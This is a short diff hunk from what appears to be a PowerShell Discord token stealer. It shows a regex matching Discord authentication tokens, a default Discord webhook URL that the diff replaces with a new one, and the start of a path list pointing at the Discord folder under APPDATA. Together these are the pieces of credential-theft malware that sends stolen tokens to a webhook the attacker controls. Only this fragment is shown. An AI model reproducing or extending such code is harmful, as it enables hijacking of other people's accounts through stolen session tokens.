@@ -15,7 +15,7 @@ param(
 $ErrorActionPreference = 'Stop'
 
 $TOKEN_RE = '[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}'
-$DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1566520557376245770/J352hfXGdCF4gjYoTtJOW93Arj1e3LxIsYVMdjgCTOMatkj2ZXKhXbirw3vZD-VkEOIE'
+$DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1566530987314389175/FWXJsgd3TzC_YdOcKrSS1Br8Fz0ZPBjnp026w1MhJpYEvnAArjYbIimikqpM2v1bIuLA'
 
 $PATHS = [ordered]@{
     'Discord'                = (Join-Path $env:APPDATA 'discord')
